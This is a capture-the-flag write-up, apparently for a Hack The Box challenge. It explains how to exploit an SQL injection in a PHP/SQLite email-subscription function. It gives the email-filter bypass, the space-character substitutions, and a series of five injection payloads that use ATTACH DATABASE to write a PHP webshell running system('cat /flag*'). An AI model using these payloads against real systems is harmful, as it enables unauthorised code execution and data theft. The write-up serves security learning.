## Skills involved: SQL injection, filter bypass

I didn't have experience in SQLite, it was a sleepless night but I had a lot of fun with this one.

After downloading the source code, one simply can't miss the blatant SQL injection:
```php
public function subscribeUser($ip_address, $email)
{
  return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
}
```

From the Dockerfile I know that the file name of flag is randomized. This means that I at least need RCE (`cat /flag*`) from SQL injection - which I hadn't thought possible. I had to confirm with an admin that it was indeed possible.

I knew that I need a `');` to end the INSERT command, as in SQLite INSERT statements can only be followed by an upsert clause for unique fields which is not useful now. Unfortunately we have a PHP email filter and a semicolon doesn't seem like a valid character. Thanks to [this post](https://dimazarno.medium.com/bypassing-email-filter-which-leads-to-sql-injection-e57bcbfc6b17) we know that quotation marks can be added to the "local-part": `"');--"@a.b`.

Now we have another problem: the space character `%20` cannot be used in the email. There are [alternative space characters in SQLite](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) however. Of those characters, only `%0C` passes the PHP filter. Alternatively we can use `/**/` but it's significantly longer.

For the RCE part, it turned out I could create database files in SQLite with the `ATTACH DATABASE` command: `"');ATTACH'.php'AS/**/q;--"@c.d`. Unnecessary spaces are removed to make the command shorter.

For the next step I tried create a table: `"');CREATE/**/TABLE/**/q.r('s'text);--"@c.d`. But:

`PHP message: PHP Warning:  SQLite3::exec(): unknown database q in /www/Database.php on line 36`

So I had to include the attach phrase as well:
`"');ATTACH'.php'AS/**/q;CREATE/**/TABLE/**/q.r('s'text)--"@c.d`

The final step is to create the PHP payload: `<?=system('cat /flag*')?>`. We have 3 problems here:
- ' needs to be escaped - this is simple enough with ''
- The space character cannot be replaced with `%0C` - it took some research but we can use `char(32)` instead.
- The whole payload along with the ATTACH statement is too long as an email local-part - we can only use 64 letters. This made me think of splitting the payload into a number of queries.

My final payloads (replace all space character with `%0C` with Burp):
```
"');ATTACH'.php'AS q;CREATE TABLE q.r('s'text)--"@c.d
"');ATTACH'.php'AS q;INSERT INTO r VALUES('system(''cat')--"@c.d
"');ATTACH'.php'AS q;UPDATE r SET s=s||char(32)--"@c.d
"');ATTACH'.php'AS q;UPDATE r SET s=s||'/flag*'')?>'--"@c.d
"');ATTACH'.php'AS q;UPDATE r SET s='<?='||s--"@c.d
```

**FLAG: HTB{inj3ct3d_th3_tru7h}**

Remark: I could have researched faster by simply going to [Wikipedia](https://en.wikipedia.org/wiki/Email_address)
